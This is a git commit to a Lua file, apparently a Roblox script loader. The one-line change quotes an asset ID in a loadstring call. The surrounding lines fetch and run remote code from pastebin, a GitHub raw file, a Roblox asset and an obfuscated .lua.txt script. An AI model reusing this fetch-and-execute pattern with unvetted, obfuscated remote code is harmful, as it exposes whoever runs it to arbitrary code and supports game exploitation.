cb8acbb81f4a919d569d4a1751e095aa1be91f6c
skibidimattgig <zedroxtt@gmail.com>
2025-06-10 21:42:05 +0300

    Update dlyauzkih.lua

--- dlyauzkih.lua
+++ dlyauzkih.lua
@@ -6,7 +6,7 @@ end
 
 load("https://pastebin.com/raw/n88ttmFh")
 coroutine.wrap(function()
-  loadstring(game:GetObjects(rbxassetid://4001118261)[1].Source)()
+  loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
 end)()
 load("https://raw.githubusercontent.com/skibidimattgig/bottlecap/refs/heads/main/flymatron%203000")
 load("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt")
